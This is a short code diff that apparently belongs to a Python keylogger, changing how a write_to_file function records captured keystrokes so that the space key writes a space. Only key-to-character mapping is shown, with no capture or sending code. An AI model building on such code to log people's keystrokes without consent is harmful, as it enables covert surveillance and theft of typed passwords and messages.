@@ -5,7 +5,7 @@ def write_to_file(key):
     letter = letter.replace("'","")
 
     if letter == 'Key.space':
-        letter = ''
+        letter = ' '
     if letter == 'Key.shift_r':
         letter = ''
     if letter == 'Key.ctr1_1':
